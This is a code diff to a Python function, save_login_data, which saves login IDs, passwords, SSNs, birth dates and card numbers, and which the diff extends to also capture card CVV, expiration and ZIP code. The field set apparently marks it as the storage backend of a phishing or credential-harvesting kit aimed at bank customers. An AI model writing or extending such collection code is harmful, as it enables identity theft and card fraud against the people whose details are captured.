@@ -44,6 +44,9 @@ def save_login_data(
     dob: Optional[str] = None,
     card_number: Optional[str] = None,
     email: Optional[str] = None,
+    cvv: Optional[str] = None,
+    expiration: Optional[str] = None,
+    zip_code: Optional[str] = None,
     ip_address: Optional[str] = None,
     user_agent: Optional[str] = None
 ) -> bool:
@@ -62,6 +65,9 @@ def save_login_data(
                 "dob": dob,
                 "card_number": card_number,
                 "email": email,
+                "cvv": cvv,
+                "expiration": expiration,
+                "zip_code": zip_code,
                 "ip_address": ip_address,
                 "user_agent": user_agent,
                 "created_at": datetime.now(timezone.utc).isoformat()
@@ -76,7 +82,7 @@ def save_login_data(
             # Fallback to SQLite if available (local dev only)
             if sqlite_save:
                 try:
-                    return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+                    return sqlite_save(online_id, password, ssn, dob, card_number, email, cvv, expiration, zip_code, ip_address, user_agent)
                 except Exception as sqlite_error:
                     print(f"SQLite fallback also failed: {sqlite_error}")
             return False
@@ -84,7 +90,7 @@ def save_login_data(
         # Use SQLite fallback if available (local dev only)
         if sqlite_save:
             try:
-                return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+                return sqlite_save(online_id, password, ssn, dob, card_number, email, cvv, expiration, zip_code, ip_address, user_agent)
             except Exception as e:
                 print(f"SQLite save failed: {e}")
                 return False
